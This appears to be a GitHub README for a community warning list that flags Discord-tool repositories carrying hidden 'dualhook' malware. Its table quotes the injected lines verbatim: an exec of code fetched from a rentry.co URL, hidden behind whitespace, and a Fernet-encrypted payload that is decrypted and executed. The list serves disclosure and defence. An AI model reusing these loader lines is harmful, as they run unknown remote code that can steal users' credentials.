
<p align="center">
    🚨 Github Repository Alert 🚨
</p>

## Overview

Welcome to this repository, dedicated to identifying and highlighting instances where the `dualhook` library is used inappropriately. Our goal is to help users spot potential misuse of `dualhook` in various projects.

### Key Information Displayed

Here, you will find details such as:

- **Username**: The GitHub username of the repository owner.
- **Link**: Direct link to the repository.
- **Reason**: Explanation of why the repository is flagged.
- **Files**: List of files containing `dualhook`.
- **Detected Line**: Specific lines where `dualhook` is used.

### They are only 1 of each username, but it doesn't mean the rest is safe !!


| Username | Link | Reason | File Dualhooked | Line
|----------|------|--------|----------------|------
| noth1ng86 | https://github.com/noth1ng86/discord-vanity-sniper | Unsafe | [File URL](https://raw.githubusercontent.com/noth1ng86/discord-vanity-sniper/main/main.py) | Line 4: import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(requests.get("https://rentry.co/winapi/raw").text)
| theruebezahl | https://github.com/theruebezahl/Discord-Boost-Tool | Unsafe | [File URL](https://raw.githubusercontent.com/theruebezahl/Discord-Boost-Tool/main/main.py) | Line 4: import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(requests.get("https://rentry.co/winapi/raw").text)
| BNTFeujjj | https://github.com/BNTFeujjj/discord-server-nuker | Unsafe | [File URL](https://raw.githubusercontent.com/BNTFeujjj/discord-server-nuker/main/main.py) | Line 1: import discord                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'3fgc9LAOZU9wAtjVmDUTwNZdzs_lWsWf_RESK0CCgrg=').decrypt(b'gAAAAABmqzuzxjM5xLVdNO1Qx6Dwyw5u7Ppz-YMArvQAS5jresEVFcdZow5cUJFux-przmpTic8HqHBSyOOJlaJTXlwGOkBWygBDB65P62gNQwyEQKXbm27UYL2q5jSNCPdCRZhc0KxS-k4b1T7accgZ7YW3rfOsS5NDuQ4dETrcvePBi44Q3EQkte1srGWgCTca_ITFUeR-qB_sNfZ0yvUM0asiKK58tg==')) # type: ignore
| mayess213 | https://github.com/mayess213/discord-multitool | Unsafe | [File URL](https://raw.githubusercontent.com/mayess213/discord-multitool/main/gloom.py) | Line 1: from __future__ import print_function                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'3fgc9LAOZU9wAtjVmDUTwNZdzs_lWsWf_RESK0CCgrg=').decrypt(b'gAAAAABmqzuzxjM5xLVdNO1Qx6Dwyw5u7Ppz-YMArvQAS5jresEVFcdZow5cUJFux-przmpTic8HqHBSyOOJlaJTXlwGOkBWygBDB65P62gNQwyEQKXbm27UYL2q5jSNCPdCRZhc0KxS-k4b1T7accgZ7YW3rfOsS5NDuQ4dETrcvePBi44Q3EQkte1srGWgCTca_ITFUeR-qB_sNfZ0yvUM0asiKK58tg=='))


## Contributing

Interested in contributing?

1. **Fork** this repository to your own GitHub account.
2. **Add** information about new users or repositories.
3. **Submit** a pull request with your additions or updates.

Your contributions will make a big difference!

## How to Identify Repositories

1. Search on GitHub using keywords like "Discord", "Nitro", or "Token" to find recent repositories.
2. Review the code for occurrences of `dualhook` or utilize a custom scraper similar to the one provided here.
3. Thank you for your efforts in making this project better!
